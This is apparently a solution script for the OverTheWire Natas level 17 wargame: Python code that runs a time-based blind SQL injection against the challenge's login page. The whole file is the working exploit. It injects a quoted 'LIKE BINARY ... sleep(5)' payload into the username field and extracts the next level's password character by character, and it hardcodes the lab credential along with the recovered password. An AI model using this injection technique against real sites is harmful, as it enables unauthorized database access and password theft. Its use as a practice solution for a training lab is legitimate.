import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''
for char in chars:
	auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
	Data = {'username' : 'natas18" and password LIKE BINARY "%' + char + '%" and sleep(5) #'}
	r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=auth, data=Data)
	if(r.elapsed.seconds >= 1):
		filtered = filtered + char

print(filtered)

for i in range(0, 32):
	for char in filtered:
		auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
		Data = {'username' : 'natas18" and password LIKE BINARY "' +passwd + char + '%" and sleep(5) #'}
		r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=auth, data=Data)
		if(r.elapsed.seconds >= 1):
			passwd = passwd + char
			print(len(passwd), " ", passwd)
			break

#passwd = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'